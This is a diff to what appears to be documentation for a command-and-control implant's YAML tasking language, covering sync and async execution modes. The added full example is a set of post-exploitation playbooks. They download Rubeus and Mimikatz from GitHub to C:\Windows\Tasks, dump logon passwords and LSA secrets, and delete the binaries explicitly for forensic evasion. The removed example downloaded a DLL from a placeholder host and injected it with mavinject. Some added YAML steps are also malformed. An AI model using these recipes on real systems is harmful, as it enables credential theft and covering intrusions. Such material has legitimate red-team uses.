@@ -171,7 +171,7 @@ sleep 10
 
 This example demonstrates how to use synchronous and asynchronous execution modes to manage dependencies between commands. It shows a scenario where a file needs to be downloaded, extracted, and then processed. Synchronous mode ensures each step completes before the next one begins, preventing errors that could occur if steps overlap, such as attempting to extract a partially downloaded file.
 
-Switching to synchronous mode is highly recommended for tasks with variable execution times or dependencies. While long sleep/checkin times *could* be used to approximate this behavior, they do not *guarantee* that tasks will complete in the correct order. Synchronous mode provides that guarantee.
+Switching to synchronous mode is highly recommended for tasks with variable execution times or dependencies. While long sleep/checkin times *could* be used to approximate this behavior, they do not *guarantee* that tasks will complete successfully if they depend on previous steps. Synchronous mode provides that guarantee.
 
 ```yaml
 commands:
@@ -195,64 +195,74 @@ commands:
 ```
 
 ### **5. Full Example**
+Here's an example script for pulling some tools down:
 
 ```
 commands:
-  - name: recon
-    description: "Gather system information"
+  - name: ghostpack_execute
+    description: "Download and execute a GhostPack tool"
     steps:
-      - action: shell
-        args: ["whoami /all"]
-
-      - action: shell
-        args: ["ipconfig /all"]
-
-      - action: shell
-        args: ["netstat -ano"]
-
-  - name: test
-    description: "test command"
-    steps:
-      - action: help
-        args: [""]
-
-      - action: help
-        args: [""]
-
-      - action: help
-        args: [""]
-
-  - name: mav_inject_dll
-    description: "Download and inject a DLL into a running process"
-    steps:
-      # Reduce sleep time for rapid check-in and command execution
+      # Reduce sleep time for faster check-in
       - action: sleep
-        args: [1]
+        args: [10]
 
-      # Download the DLL to target machine
-      - action: get_http
-        args: ["http://someip/malicious.dll", "C:\\malicious.dll"]
+      - action: execution_mode # flip to sync so the download completes before running the next command
+        args: ['sync']
 
-      # Inject the DLL into a running process (ensure it's fully downloaded)
-      - action: shell # Note- implenting a direct `start-process` later
-        args: ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]
+      # Download the GhostPack tool (e.g., Rubeus.exe)
+      - action: http_get
+        args: ["https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Rubeus.exe", "C:\\Windows\\Tasks\\sometool.exe"]
 
-      # Delete the evidence
+      # Execute the tool using shell command
       - action: shell
-        args: ["del /Q C:\\malicious.dll"]
+        args: ["C:\\Windows\\Tasks\\sometool.exe dump"]
 
-      # Restore sleep time to original value (or track previous value)
+      # Delete the tool after execution to reduce forensic footprint
+      - action: delete_file
+        args: ["C:\\Windows\\Tasks\\sometool.exe"]
+
+      - action: execution_mode
+        args: ['async']
+
+      # Restore sleep time
       - action: sleep
-        args: [60]
-
-  - name: clean_up
-    description: "Remove temporary files"
+        args: [10]
+        
+  - name: mimikatz_cred_dump
+    description: "Download and execute Mimikatz to dump credentials"
     steps:
-      - action: shell
-        args: ["del /Q C:\\temp\\payload.bin"]
+      # Reduce sleep time for faster check-in
+      - action: sleep
+        args: [10]
 
-      - action: shell
-        args: ["del /Q C:\\temp\\payload.ps1"]
+      - action: execution_mode # flip to sync so the download completes before running the next command
+        args: ['sync']
+
+      # Download Mimikatz to a less suspicious location
+      - action: http_get
+        args: ["https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe", "C:\\Windows\\Tasks\\mimi.exe"]
+
+      # Extract logon passwords
+        action: shell
+        args: ["C:\\Windows\\Tasks\\mimi.exe privilege::debug sekurlsa::logonpasswords exit"]
+
+      # Extract LSA secrets
+        action: shell
+        args: ["C:\\Windows\\Tasks\\mimi.exe privilege::debug sekurlsa::secrets exit"]
+
+
+      # Delete the Mimikatz binary and output file for forensic evasion
+      - action: delete_file
+        args: ["C:\\Windows\\Tasks\\mimi.exe"]
+
+      - action: execution_mode
+        args: ['async']
+
+      # Restore sleep time to normal
+      - action: sleep
+        args: [10]
+
+
 
 ```
 
